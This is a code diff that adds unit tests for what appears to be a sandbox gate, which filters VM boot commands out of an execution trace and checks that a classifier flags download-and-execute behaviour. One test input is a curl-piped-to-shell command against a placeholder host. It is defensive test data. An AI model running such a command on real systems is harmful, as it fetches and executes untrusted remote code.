@@ -266,6 +266,29 @@ def test_build_evidence_delivered_needs_reply():
     assert ("10.66.0.1", 53) not in flows      # infra filtered out
 
 
+def test_execs_after_marker_drops_boot_noise():
+    from backend.gate import execs_after_marker
+    execs = [
+        "systemctl enable audit-stream.service",            # VM boot
+        "/lib/systemd/systemd-executor --deserialize 83",   # VM boot
+        "/bin/echo JARVISGATEMARK7",                        # the run's marker
+        "sh -c curl http://x | sh",                          # the run's command
+        "curl http://x",
+    ]
+    got = execs_after_marker(execs, "JARVISGATEMARK7")
+    assert got == ["sh -c curl http://x | sh", "curl http://x"]
+    # boot-only persistence execs no longer reach the classifier
+    c = sandbox.classify(_ev(execs=got), {})
+    assert not any(b["kind"] == "persistence" for b in c["behavior"])
+    assert any(b["kind"] == "download-exec" for b in c["behavior"])
+
+
+def test_execs_after_marker_missing_keeps_all():
+    from backend.gate import execs_after_marker
+    execs = ["a", "b"]
+    assert execs_after_marker(execs, "NOPE") == ["a", "b"]
+
+
 def test_parse_audit_paths_reads_only_jread_events():
     from backend.gate import parse_audit_paths
     text = (
